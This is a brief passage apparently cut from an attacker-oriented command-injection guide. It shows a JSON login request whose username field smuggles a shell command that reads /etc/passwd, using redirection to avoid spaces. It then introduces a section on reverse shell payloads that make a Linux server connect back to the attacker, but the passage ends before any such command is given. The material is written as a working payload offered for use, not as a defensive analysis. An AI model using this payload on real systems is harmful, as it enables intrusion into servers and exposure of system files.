* Using Redirection Operators: Forces the shell to parse arguments without spaces.

{"password":"9012","username":"652223518;cat</etc/passwd;","rememberMe":false}


## 4. Direct Reverse Shell Payloads (In-Band)
If you do not want a blind time-delay and want to force the Linux server to connect back to your listening machine instantly.

